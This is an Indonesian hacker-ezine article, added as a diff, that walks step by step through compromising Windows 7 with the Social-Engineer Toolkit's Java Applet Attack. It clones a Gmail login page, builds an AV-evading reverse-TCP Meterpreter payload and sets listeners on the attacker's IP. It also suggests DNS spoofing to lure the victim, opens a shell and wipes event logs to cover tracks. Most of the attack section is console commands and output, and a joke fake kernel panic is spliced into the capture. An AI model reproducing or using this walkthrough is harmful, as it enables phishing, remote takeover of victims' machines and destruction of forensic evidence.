@@ -1,0 +1,557 @@
+ECHO MAGAZINE VOLUME X, ISSUE XXVI, PHILE 0x10.TXT
+ ___                             
+ )_  _ ( _   _  | __   o  _   _  
+(__ (_  ) ) (_) |   )  ( ) ) )_) 
+                |  (__      (_             
+
+     Hacker Log Book: Exploiting Windows 7 via Java Applet Attack Method (JAM)
+     nimo | kim_diamond1 [at] yahoo [dot] com
+
+-----| Pendahuluan
+
+Hasil survei "Net Application" mengenai popularitas OS yang paling banyak
+digunakan, dikatakan bahwa OS windows memiliki persentasi kepopuleran sebesar
+92%, Mac OS memiliki persentasi kepopuleran sebesar 7%, dan 1% untuk
+kepopuleran OS lainnya.  Hal ini terjadi dikarenakan para pengguna menganggap
+OS windows lebih mudah dipahami, lebih mudah digunakan, lebih banyak ragam
+variasi program, dan lebih cantik desain tampilannya.
+
+OS Windows 7 merupakan OS versi terkini yang dirilis oleh Microsoft, dan OS
+windows 7 ini dikatakan sebagai penyempurnaan dari OS Windows sebelumnya
+(vista). Penyempurnaan yang telah dilakukan diantaranya yaitu dari sisi
+penampilan, kompatibilitas, dan security.
+
+Namun seiring perkembangan teknik hacking maka bagaimanapun canggihnya OS
+Windows 7 tetap memiliki celah keamanan yang bisa ditembus. "Java applet attack
+method" adalah salah satu teknik yang bisa digunakan untuk menembus keamanan OS
+Windows 7 meskipun telah terproteksi oleh firewall. Teknik ini diperkenalkan
+oleh "Thomas Werth" pada bulan juli tahun 2010.
+
+Sesuai dengan namanya teknik ini memanfaatkan malicious java applet yang
+diinjeksikan kedalam website palsu (kloningan) dan akan muncul melalui
+perantara web browser client (IE, firefox, chrome, opera, dll). Seorang victim
+yang tanpa sadar mendapatkan malicious java applet dari attacker kemudian
+menjalankannya, maka tanpa diketahui oleh victim akses system miliknya sudah
+didapatkan oleh sang attacker. Oleh karenanya dalam artikel ini saya akan
+menjabarkan bagaimana melakukan remote exploit OS Windows 7 menggunakan "Java
+applet attack Method (JAM)".
+
+
+-----| Siapa sebagai apa
+
+Terdapat dua sisi subjek dalam artikel ini, yaitu :
+
+1. Sisi saya sebagai attacker yang menggenerate malicious java applet kemudian
+   merilisnya untuk victim.
+2. Sisi target sebagai victim yang menerima malicious java applet kemudian 
+   mengeksekusinya.
+
+
+
+-----| Requirement
+
+Peralatan yang attacker butuhkan adalah sebagai berikut :
+
+1. Backtrak 5 R2
+2. Social-Engineering Toolkit (SET) yang didalamnya terdapat module JAM.
+3. Metasploit Framework
+
+Peralatan yang mesti ada di victim :
+
+1. OS Windows 7 yang terproteksi firewall 
+   (dalam artikel ini yang digunakan adalah OS Windows 7 Professional)
+2. Web browser client 
+   (dalam artikel ini yang digunakan adalah Internet Explorer v.8)
+
+
+
+-----| IP Address
+
+IP address attacker adalah 192.168.175.132, sedangkan IP address untuk victim
+tidak perlu diketahui, asalkan antara mesin attacker dan victim bisa saling
+berkomunikasi.
+
+-----| Action
+
+Dalam menjabarkan bagaimana melakukan remote exploit OS Windows 7 via JAM,
+attacker membaginya menjadi empat fase, yaitu :
+
+-------| 1.Fase persiapan
+   
+Pada fase ini yang attacker lakukan adalah:
+
+1.1. Menjalankan tool SET yang telah terinstall di Backtrack 5 R2
+1.2. Memilih menu "1) Social-Engineering Attacks"
+1.3. Memilih menu "2) Website Attack Vectors"
+1.4. Memilih method "1) Java Applet Attack Method"
+1.5. Memilih model kloningan "1) Web Templates"
+1.6. Memilih template website yang akan dikloning "2. Gmail"
+1.7. Memilih payload untuk malicious java applet "2) Windows Reverse_TCP
+Meterpreter"
+1.8. Memilih encoding backdoored executable "(langsung enter saja)"
+1.9. Menentukan PORT of Listener [443] "(langsung enter saja)"
+   
+Untuk lebih jelas berikut capture-an langkahnya :
+
+=================================================
+|/ root@bt:/pentest/exploits/set# ./set
+|| 
+||                                                
+||                     :::===  :::===== :::====
+||                     :::     :::      :::====
+||                      =====  ======     ===  
+||                         === ===        ===  
+||                     ======  ========   ===  
+|| 
+|| 
+||   [---]        The Social-Engineer Toolkit (SET)         [---]
+||   [---]        Created by: David Kennedy (ReL1K)         [---]
+||   [---]        Development Team: JR DePre (pr1me)        [---]
+||   [---]        Development Team: Joey Furr (j0fer)       [---]
+||   [---]        Development Team: Thomas Werth            [---]
+||   [---]        Development Team: Garland                 [---]
+||   [---]                 Version: 3.3.1                   [---]
+||   [---]         Codename: 'DerbyCon 2.0 Edition'         [---]
+||   [---]         Report bugs: davek@secmaniac.com         [---]
+||   [---]         Follow me on Twitter: dave_rel1k         [---]
+||   [---]        Homepage: http://www.secmaniac.com        [---]
+|| 
+||    Welcome to the Social-Engineer Toolkit (SET). Your one
+||     stop shop for all of your social-engineering needs..
+||     
+||     Join us on irc.freenode.net in channel #setoolkit
+|| 
+||     DerbyCon 2.0 'The Reunion' - Tickets are on sale!!!
+||      September 27th - 30th 2012 | Louisville Kentucky
+||                 http://www.derbycon.com
+|| 
+||  Select from the menu:
+|| 
+||    1) Social-Engineering Attacks
+||    2) Fast-Track Penetration Testing
+||    3) Third Party Modules
+||    4) Update the Metasploit Framework
+||    5) Update the Social-Engineer Toolkit
+||    6) Help, Credits, and About
+|| 
+||   99) Exit the Social-Engineer Toolkit
+|| 
+|| set> 1
+|| 
+|| 
+||                          .--.  .--. .-----.
+||                         : .--': .--'`-. .-'
+||                         `. `. : `;    : :  
+||                          _`, :: :__   : :  
+||                         `.__.'`.__.'  :_;   
+|| 
+||   [---]        The Social-Engineer Toolkit (SET)         [---]
+||   [---]        Created by: David Kennedy (ReL1K)         [---]
+||   [---]        Development Team: JR DePre (pr1me)        [---]
+||   [---]        Development Team: Joey Furr (j0fer)       [---]
+||   [---]        Development Team: Thomas Werth            [---]
+||   [---]        Development Team: Garland                 [---]
+||   [---]                 Version: 3.3.1                   [---]
+||   [---]         Codename: 'DerbyCon 2.0 Edition'         [---]
+||   [---]         Report bugs: davek@secmaniac.com         [---]
+||   [---]         Follow me on Twitter: dave_rel1k         [---]
+||   [---]        Homepage: http://www.secmaniac.com        [---]
+|| 
+||    Welcome to the Social-Engineer Toolkit (SET). Your one
+||     stop shop for all of your social-engineering needs..
+||     
+||     Join us on irc.freenode.net in channel #setoolkit
+|| 
+||     DerbyCon 2.0 'The Reunion' - Tickets are on sale!!!
+||      September 27th - 30th 2012 | Louisville Kentucky
+||                 http://www.derbycon.com
+|| 
+||  Select from the menu:
+|| 
+||    1) Spear-Phishing Attack Vectors
+||    2) Website Attack Vectors
+||    3) Infectious Media Generator
+||    4) Create a Payload and Listener
+||    5) Mass Mailer Attack
+||    6) Arduino-Based Attack Vector
+||    7) SMS Spoofing Attack Vector
+||    8) Wireless Access Point Attack Vector
+||    9) QRCode Generator Attack Vector
+||   10) Powershell Attack Vectors
+||   11) Third Party Modules
+|| 
+||   99) Return back to the main menu.
+|| 
+|| set> 2
+||
+||  The Web Attack module is  a unique way of utilizing multiple web-based attacks
+||  in order to compromise the intended victim.
+|| 
+||  The Java Applet Attack method will spoof a Java Certificate and deliver a 
+||  metasploit based payload. Uses a customized java applet created by Thomas
+||  Werth to deliver the payload.
+|| 
+||  The Metasploit Browser Exploit method will utilize select Metasploit
+||  browser exploits through an iframe and deliver a Metasploit payload.
+|| 
+||  The Credential Harvester method will utilize web cloning of a web-
+||  site that has a username and password field and harvest all the 
+||  information posted to the website.
+|| 
+||  The TabNabbing method will wait for a user to move to a different
+||  tab, then refresh the page to something different.
+|| 
+||  The Man Left in the Middle Attack method was introduced by Kos and 
+||  utilizes HTTP REFERER's in order to intercept fields and harvest 
+||  data from them. You need to have an already vulnerable site and in-
+||  corporate <script src="http://YOURIP/">. This could either be from a
+||  compromised site or through XSS.
+|| 
+||  The Web-Jacking Attack method was introduced by white_sheep, Emgent 
+||  and the Back|Track team. This method utilizes iframe replacements to 
+||  make the highlighted URL link to appear legitimate however when clicked 
+||  a window pops up then is replaced with the malicious link. You can edit
+||  the link replacement settings in the set_config if its too slow/fast.
+|| 
+||  The Multi-Attack method will add a combination of attacks through the web attack
+||  menu. For example you can utilize the Java Applet, Metasploit Browser,
+||  Credential Harvester/Tabnabbing, and the Man Left in the Middle attack
+||  all at once to see which is successful.
+|| 
+||    1) Java Applet Attack Method
+||    2) Metasploit Browser Exploit Method
+||    3) Credential Harvester Attack Method
+||    4) Tabnabbing Attack Method
+||    5) Man Left in the Middle Attack Method
+||    6) Web Jacking Attack Method
+||    7) Multi-Attack Web Method
+||    8) Victim Web Profiler
+||    9) Create or import a CodeSigning Certificate
+|| 
+||   99) Return to Main Menu
+|| 
+|| set:webattack>1
+|| 
+||  The first method will allow SET to import a list of pre-defined web 
+||  applications that it can utilize within the attack.
+|| 
+||  The second method will completely clone a website of your choosing
+||  and allow you to utilize the attack vectors within the completely
+||  same web application you were attempting to clone.
+|| 
+||  The third method allows you to import your own website, note that you
+||  should only have an index.html when using the import website
+||  functionality.
+||    
+||    1) Web Templates
+||    2) Site Cloner
+||    3) Custom Import
+|| 
+||   99) Return to Webattack Menu
+|| 
+|| set:webattack>1
+|| 
+||   1. Java Required 
+||   2. Gmail
+||   3. Google
+||   4. Facebook
+||   5. Twitter
+|| 
+|| set:webattack> Select a template:2
+|| 
+|| [*] Cloning the website: https://gmail.com
+|| [*] This could take a little bit...
+|| [*] Injecting Java Applet attack into the newly cloned website.
+|| [*] Filename obfuscation complete. Payload name is: phfpcOTlq
+|| [*] Malicious java applet website prepped for deployment
+|| 
+|| [!] ERROR:UPX packer not found in the pathname specified in config. Disabling UPX packing for executable!
+|| 
+|| What payload do you want to generate:
+|| 
+||   Name:                                       Description:
+|| 
+||    1) Windows Shell Reverse_TCP               Spawn a command shell on victim and send back to attacker
+||    2) Windows Reverse_TCP Meterpreter         Spawn a meterpreter shell on victim and send back to attacker
+||    3) Windows Reverse_TCP VNC DLL             Spawn a VNC server on victim and send back to attacker
+||    4) Windows Bind Shell                      Execute payload and create an accepting port on remote system
+||    5) Windows Bind Shell X64                  Windows x64 Command Shell, Bind TCP Inline
+||    6) Windows Shell Reverse_TCP X64           Windows X64 Command Shell, Reverse TCP Inline
+||    7) Windows Meterpreter Reverse_TCP X64     Connect back to the attacker (Windows x64), Meterpreter
+||    8) Windows Meterpreter Egress Buster       Spawn a meterpreter shell and find a port home via multiple ports
+||    9) Windows Meterpreter Reverse HTTPS       Tunnel communication over HTTP using SSL and use Meterpreter
+||   10) Windows Meterpreter Reverse DNS         Use a hostname instead of an IP address and spawn Meterpreter
+||   11) SE Toolkit Interactive Shell            Custom interactive reverse toolkit designed for SET
+||   12) SE Toolkit HTTP Reverse Shell           Purely native HTTP shell with AES encryption support
+||   13) RATTE HTTP Tunneling Payload            Security bypass payload that will tunnel all comms over HTTP
+||   14) ShellCodeExec Alphanum Shellcode        This will drop a meterpreter payload through shellcodeexec (A/V Safe)
+||   15) Import your own executable              Specify a path for your own executable
+|| 
+|| set:payloads>2
+|| 
+|| Below is a list of encodings to try and bypass AV. 
+|| 
+|| Select one of the below, 'backdoored executable' is typically the best.
+|| 
+||    1) avoid_utf8_tolower (Normal)
+||    2) shikata_ga_nai (Very Good)
+||    3) alpha_mixed (Normal)
+||    4) alpha_upper (Normal)
+||    5) call4_dword_xor (Normal)
+||    6) countdown (Normal)
+||    7) fnstenv_mov (Normal)
+||    8) jmp_call_additive (Normal)
+||    9) nonalpha (Normal)
+||   10) nonupper (Normal)
+||   11) unicode_mixed (Normal)
+||   12) unicode_upper (Normal)
+||   13) alpha2 (Normal)
+||   14) No Encoding (None)
+||   15) Multi-Encoder (Excellent)
+||   16) Backdoored Executable (BEST)
+|| 
+|| set:encoding>
+|| set:payloads> PORT of the listener [443]:
+|| [*] Generating x64-based powershell injection code...
+|| [*] Generating x86-based powershell injection code...
+|| [*] Finished generating powershell injection attack and is encoded to bypass execution restriction...
+|| [-] Backdooring a legit executable to bypass Anti-Virus. Wait a few seconds...
+|| [*] Backdoor completed successfully. Payload is now hidden within a legit executable.
+|| [*] UPX Encoding is set to ON, attempting to pack the executable with UPX encoding.
+|| [!] UPX was not detected. Try configuring the set_config again.
+|| [*] Digital Signature Stealing is ON, hijacking a legit digital certificate
+|| [*] Generating OSX payloads through Metasploit...
+|| [*] Generating Linux payloads through Metasploit...
+|| 
+|| ***************************************************
+|| Web Server Launched. Welcome to the SET Web Attack.
+|| ***************************************************
+|| 
+|| [--] Tested on IE6, IE7, IE8, IE9, Safari, Opera, Chrome, and FireFox [--]
+|| 
+|| [*] Moving payload into cloned website.
+|| [*] The site has been moved. SET Web Server is now listening..
+|| [-] Launching MSF Listener...
+|| [-] This may take a few to load MSF...
+|| [-] ***
+|| [-] * WARNING: Database support has been disabled
+|| [-] ***
+|| 
+|| 
+|| Unable to handle kernel NULL pointer dereference at virtual address 0xd34db33f
+|| EFLAGS: 00010046
+|| eax: 00000001 ebx: f77c8c00 ecx: 00000000 edx: f77f0001
+|| esi: 803bf014 edi: 8023c755 ebp: 80237f84 esp: 80237f60
+|| ds: 0018   es: 0018  ss: 0018
+|| Process Swapper (Pid: 0, process nr: 0, stackpage=80377000)
+|| 
+|| 
+|| Stack: 90909090990909090990909090
+||        90909090990909090990909090
+||        90909090.90909090.90909090
+||        90909090.90909090.90909090
+||        90909090.90909090.09090900
+||        90909090.90909090.09090900
+||        ..........................
+||        cccccccccccccccccccccccccc
+||        cccccccccccccccccccccccccc
+||        ccccccccc.................
+||        cccccccccccccccccccccccccc
+||        cccccccccccccccccccccccccc
+||        .................ccccccccc
+||        cccccccccccccccccccccccccc
+||        cccccccccccccccccccccccccc
+||        ..........................
+||        ffffffffffffffffffffffffff
+||        ffffffff..................
+||        ffffffffffffffffffffffffff
+||        ffffffff..................
+||        ffffffff..................
+||        ffffffff..................
+|| 
+|| 
+|| Code: 00 00 00 00 M3 T4 SP L0 1T FR 4M 3W OR K! V3 R5 I0 N4 00 00 00 00
+|| Aiee, Killing Interrupt handler
+|| Kernel panic: Attempted to kill the idle task!
+|| In swapper task - not syncing
+|| 
+|| 
+|| 
+||        =[ metasploit v4.4.0-dev [core:4.4 api:1.0]
+|| + -- --=[ 896 exploits - 484 auxiliary - 150 post
+|| + -- --=[ 251 payloads - 28 encoders - 8 nops
+||        =[ svn r15578 updated 4 days ago (2012.07.06)
+|| 
+|| [*] Processing /pentest/exploits/set/src/program_junk/meta_config for ERB directives.
+|| resource (/pentest/exploits/set/src/program_junk/meta_config)> use exploit/multi/handler
+|| resource (/pentest/exploits/set/src/program_junk/meta_config)> set PAYLOAD windows/meterpreter/reverse_tcp
+|| PAYLOAD => windows/meterpreter/reverse_tcp
+|| resource (/pentest/exploits/set/src/program_junk/meta_config)> set LHOST 0.0.0.0
+|| LHOST => 0.0.0.0
+|| resource (/pentest/exploits/set/src/program_junk/meta_config)> set LPORT 443
+|| LPORT => 443
+|| resource (/pentest/exploits/set/src/program_junk/meta_config)> set ExitOnSession false
+|| ExitOnSession => false
+|| resource (/pentest/exploits/set/src/program_junk/meta_config)> exploit -j
+|| [*] Exploit running as background job.
+|| resource (/pentest/exploits/set/src/program_junk/meta_config)> use exploit/multi/handler
+|| resource (/pentest/exploits/set/src/program_junk/meta_config)> set PAYLOAD osx/x86/shell_reverse_tcp
+|| [*] Started reverse handler on 0.0.0.0:443 
+|| [*] Starting the payload handler...
+|| PAYLOAD => osx/x86/shell_reverse_tcp
+|| resource (/pentest/exploits/set/src/program_junk/meta_config)> set LHOST 192.168.175.132
+|| LHOST => 192.168.175.132
+|| resource (/pentest/exploits/set/src/program_junk/meta_config)> set LPORT 8080
+|| LPORT => 8080
+|| resource (/pentest/exploits/set/src/program_junk/meta_config)> set InitialAutoRunScript post/osx/gather/enum_osx
+|| InitialAutoRunScript => post/osx/gather/enum_osx
+|| resource (/pentest/exploits/set/src/program_junk/meta_config)> set ExitOnSession false
+|| ExitOnSession => false
+|| resource (/pentest/exploits/set/src/program_junk/meta_config)> exploit -j
+|| [*] Exploit running as background job.
+|| resource (/pentest/exploits/set/src/program_junk/meta_config)> use exploit/multi/handler
+|| resource (/pentest/exploits/set/src/program_junk/meta_config)> set PAYLOAD linux/x86/shell/reverse_tcp
+|| PAYLOAD => linux/x86/shell/reverse_tcp
+|| [*] Started reverse handler on 192.168.175.132:8080 
+|| [*] Starting the payload handler...
+|| resource (/pentest/exploits/set/src/program_junk/meta_config)> set LHOST 192.168.175.132
+|| LHOST => 192.168.175.132
+|| resource (/pentest/exploits/set/src/program_junk/meta_config)> set LPORT 8081
+|| LPORT => 8081
+|| resource (/pentest/exploits/set/src/program_junk/meta_config)> set ExitOnSession false
+|| ExitOnSession => false
+|| resource (/pentest/exploits/set/src/program_junk/meta_config)> exploit -j
+|| [*] Exploit running as background job.
+|| msf  exploit(handler) > 
+|| [*] Started reverse handler on 192.168.175.132:8081 
+|\ [*] Starting the payload handler...
+==========================================================
+
+Hasil yang didapatkan dari fase persiapan adalah sebuah website kloningan
+berupa halaman login gmail yang siap dirilis & telah diinjeksikan malicious
+java applet, serta listener attacker dalam keadaan standby (Proses payload &
+port of listener memanfaatkan metasploit framework secara otomatis). 
+
+Bila dicermati attacker memilih payload "Reverse_TCP Meterpreter" hal ini
+dimaksudkan untuk menyiasati adanya firewall di OS Windows 7 victim, dengan
+payload tersebut maka victim yang akan melakukan connect back kepada attacker
+sehingga firewall victim akan terkelabui.
+ 
+Dikarenakan website kloningan telah siap dirilis, maka attacker tinggal
+mengarahkan victim agar mau mengakses website kloningan melalui browser IE nya
+(http://192.168.175.132) dan tidak lama kemudian akan muncul Popup java
+(malicious java applet). Selanjutnya masuk ke fase exploitasi.
+
+Note : Teknik mengarahkankan victim akan lebih smooth bila menggunakan teknik
+DNS spoofing, tetapi dalam artikel ini anggap saja victim berhasil diarahkan.
+
+
+-------| 2. Fase exploitasi
+
+Pada fase ini yang victim lakukan adalah mengeksekusi Popup java yang muncul
+dengan cara mengklik "Run".  Setelah victim melakukan hal tesebut maka tanpa
+victim sadari proses eksploitasi sedang terjadi, sedangkan website kloningan
+akan berubah menjadi website asli. Hasilnya adalah OS Windows 7 victim akan
+konek ke listener attacker (tentu tanpa sepengetahuan victim). 
+
+Berikut capture-annya :
+
+==========================================================
+|/ msf  exploit(handler) > 
+|| [*] Started reverse handler on 192.168.175.132:8081 
+|| [*] Starting the payload handler...
+|| 192.168.175.143 - - [10/Jul/2012 02:55:03] "GET / HTTP/1.1" 200 -
+|| 192.168.175.143 - - [10/Jul/2012 02:55:19] "GET /Signed_Update.jar HTTP/1.1" 200 -
+|| 192.168.175.143 - - [10/Jul/2012 02:55:28] "GET /phfpcOTlq HTTP/1.1" 200 -
+|| [*] Sending stage (752128 bytes) to 192.168.175.143
+|| [*] Meterpreter session 1 opened (192.168.175.132:443 -> 192.168.175.143:49605) at 2012-07-10 02:55:45 -0400
+|| 
+|| msf  exploit(handler) > 
+|| msf  exploit(handler) > sessions -i 1
+|| [*] Starting interaction with 1...
+|| 
+|\ meterpreter >
+==========================================================
+
+Jelas attacker telah sukses mendapatkan akses meterpreter ke OS Windows 7
+Victim (ip address : 192.168.175.143).
+
+-------| 3. Fase gaining access
+
+Pada fase ini attacker telah mendapatkan akses meterpreter ke victim, kemudian
+attacker melakukan : 
+
+3.1. Mengecek informasi mengenai OS Windows 7 victim
+3.2. Mendapatkan akses shell victim
+   
+Berikut capture-annya :
+
+==========================================================
+|/ meterpreter > sysinfo
+|| Computer        : WIN-4C2ELIJP168
+|| OS              : Windows 7 (Build 7600).
+|| Architecture    : x86
+|| System Language : en_US
+|| Meterpreter     : x86/win32
+|| meterpreter > 
+|| meterpreter > 
+|| meterpreter > shell
+|| Process 2548 created.
+|| Channel 2 created.
+|| Microsoft Windows [Version 6.1.7600]
+|| Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+|| 
+|\ C:\Users\INSPIRON\Desktop>
+==========================================================
+
+Attacker sukses mendapatkan informasi mesin & shell victim.
+
+
+-------|  4.Fase covering track
+
+Setelah sukses menyusup kedalam sistem victim, maka fase terakhir adalah
+menutupi jejak-jejak penyerangan yang sudah dilakukan attacker dengan cara
+menghapus log yang ada di OS Windows 7 victim, dalam hal ini mempergunakan
+module "clearenv" di metasploit.
+
+Berikut capture-annya :
+
+==========================================================
+|/ meterpreter >
+|| meterpreter >
+|| meterpreter > clearev
+|| [*] Wiping 138 records from Application...
+|| [*] Wiping 353 records from System...
+|| [*] Wiping 144 records from Security...
+|| meterpreter >
+|| meterpreter > exit
+|| [*] Shutting down Meterpreter...
+||
+|\ [*] Meterpreter Session 1 closed. Reason: User exit
+==========================================================
+
+-----| Kesimpulan
+
+Remote Exploit OS Windows 7 via Java Applete Attack Methode (JAM) berhasil
+dilakukan meskipun OS Windows 7 terproteksi oleh firewall. Setelah melakukan
+percobaan ternyata bukan hanya browser IE v.8 saja yang bisa dimanfaatkan untuk
+penyerangan teknik JAM ini, browser IE v.9, Mozilla firefox, Opera, dan Chrome
+pun bisa dimanfaatkan untuk teknik penyerangan ini.
+
+-----| Referensi
+
+1. http://netmarketshare.com/operating-system-market-share.aspx?qprid=8&qpcustomd=0
+2. https://www.trustedsec.com/july-2010/thomas-werth-java-applet-open-sourced/
+3. http://www.scribd.com/doc/54320804/3/Java-Applet-Attack-Vector
+4. http://www.microsoft.com/security/portal/Threat/Encyclopedia/Entry.aspx?Name=Exploit%3AJava%2FCVE-2010-0840.OS
+5. http://www.microsoft.com/security/portal/Threat/Encyclopedia/Entry.aspx?Name=TrojanDownloader%3aJava%2fOpenConnection
+6. http://www.offensive-security.com/metasploit-unleashed/SET_Java_Applet_Attack
+7. http://blog.binadarma.ac.id/usman/wp-content/uploads/2011/07/JENI-Intro2-Bab11-Applet.pdf
+
+
+-----| Greetz to
+
+Lovely hikaru sudo, 
+Crypto Task Force (CTF) Vertigo, 
+y3dips, az001, de_templar, all echo staff, 
+RM-70 Harsono, and the readers.
